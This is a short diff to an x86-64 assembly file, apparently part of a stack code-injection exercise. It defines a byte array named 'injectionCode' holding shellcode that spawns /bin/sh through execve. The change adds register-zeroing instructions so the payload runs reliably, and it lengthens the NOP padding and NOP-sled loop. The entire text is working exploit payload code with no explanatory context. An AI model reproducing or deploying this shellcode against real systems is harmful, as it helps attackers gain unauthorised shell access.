@@ -5,13 +5,15 @@ section .data
 EXIT_SUCCESS	equ		0           ; success code
 SYS_exit		equ		60          ; exit
 
-STRLEN		    equ     32
+STRLEN		    equ     40
+NOPLENGTH       equ     8
 
 injectionCode           db      0x48, 0x31, 0xC0, 0x50, 0x48, 0xBB, 0x2F, 0x2F
                         db      0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x53, 0xB0
-                        db      0x3B, 0x48, 0x89, 0xE7, 0x0F, 0x05, 0x90, 0x90
+                        db      0x3B, 0x48, 0x89, 0xE7, 0x48, 0x31, 0xF6, 0x48
+                        db      0x31, 0xD2, 0x0F, 0x05, 0x90, 0x90, 0x90, 0x90
 
-injectionCodeLength     dq      24
+injectionCodeLength     dq      32
 
 
 section .text
@@ -27,7 +29,7 @@ funStart:
 nopLoop:
     mov     byte [rsp+rcx], 0x90
     inc     rcx
-    cmp     rcx, 8
+    cmp     rcx, NOPLENGTH
     jb      nopLoop
 
     mov     rbx, 0
